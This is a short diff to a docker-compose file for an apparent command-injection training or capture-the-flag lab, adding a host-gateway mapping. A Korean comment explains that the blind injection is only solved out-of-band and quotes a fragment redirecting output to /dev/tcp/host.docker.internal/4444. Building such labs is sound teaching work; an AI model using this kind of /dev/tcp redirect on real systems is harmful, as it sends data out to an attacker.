@@ -167,6 +167,10 @@ services:
     ports: ["9206:9206"]
     environment:
       - FLAG_CMDI_1=${FLAG_CMDI_1}
+    # blind 커맨드 인젝션이라 OOB 로만 회수된다(`> /dev/tcp/host.docker.internal/4444`).
+    # Linux 엔진엔 이 이름이 없어 풀이가 조용히 실패한다 → 호스트 게이트웨이로 매핑.
+    extra_hosts:
+      - "host.docker.internal:host-gateway"
     profiles: ["all", "day1", "injection"]
     restart: unless-stopped
 
